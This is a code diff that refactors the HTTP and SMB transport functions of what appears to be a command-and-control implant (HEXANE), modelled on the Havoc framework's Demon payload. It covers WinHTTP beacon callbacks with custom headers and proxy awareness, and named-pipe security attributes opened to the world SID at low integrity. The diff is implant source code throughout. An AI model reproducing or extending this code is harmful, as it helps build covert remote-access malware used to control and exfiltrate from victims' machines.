@@ -1,8 +1,7 @@
 #include <core/include/network.hpp>
 namespace Http {
+    VOID HttpCallback(const _stream *const out, _stream **in) {
     // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
-
-    VOID HttpCallback(_stream *out, _stream **in) {
         HEXANE
 
         HINTERNET connect = nullptr;
@@ -25,7 +24,6 @@ namespace Http {
         LPWSTR endpoint     = { };
         ULONG flags         = 0;
         ULONG n_endpoint    = 0;
-        ULONG n_headers     = 0;
 
         HANDLE TestToken = { };
 
@@ -66,6 +64,7 @@ namespace Http {
 
         if (Ctx->Transport.http->Headers) {
             // macro is redundant and silly but makes the code looks nicer/ slightly less typing.
+            ULONG n_headers = 0;
             DYN_ARRAY_EXPR(
                 n_headers, Ctx->Transport.http->Headers,
                 header = Ctx->Transport.http->Headers[n_headers];
@@ -76,8 +75,6 @@ namespace Http {
         }
 
         if (Ctx->Transport.bProxy) {
-            // Proxy-Awareness : https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L138
-
             proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
             proxy_info.lpszProxy     = Ctx->Transport.http->ProxyAddress;
 
@@ -144,11 +141,6 @@ namespace Http {
             }
         }
 
-        __debugbreak();
-        if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenThreadToken(NtCurrentThread(), TOKEN_READ, FALSE, &TestToken))) {
-            return_defer(ntstatus);
-        }
-        // ZwOpenThreadToken fails : NtCurrentThread STATUS_NO_TOKEN (?)
         if (
             !Ctx->win32.WinHttpSendRequest(request, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
             !Ctx->win32.WinHttpReceiveResponse(request, nullptr)) {
@@ -186,7 +178,6 @@ namespace Http {
 
             x_memcpy(B_PTR(download) + total, buffer, read);
             ZeroFreePtr(buffer, read);
-
             total += read;
 
         } while (length > 0);
@@ -207,7 +198,7 @@ namespace Http {
 
 namespace Smb {
 
-    VOID SmbContextDestroy(PSMB_PIPE_SEC_ATTR SmbSecAttr) {
+    VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
         HEXANE
 
         if (SmbSecAttr->Sid) {
@@ -226,7 +217,7 @@ namespace Smb {
         }
     }
 
-    VOID SmbContextInit(PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
+    VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
         HEXANE
 
         SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
@@ -234,7 +225,6 @@ namespace Smb {
 
         EXPLICIT_ACCESSA access = {};
         PACL acl = {};
-        ULONG result = 0;
 
         x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
         x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));
@@ -252,7 +242,7 @@ namespace Smb {
         access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->Sid);
 
         if (
-            !(result = Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
+            !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
             !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->SidLow)) {
             return_defer(ERROR_INVALID_SID);
         }
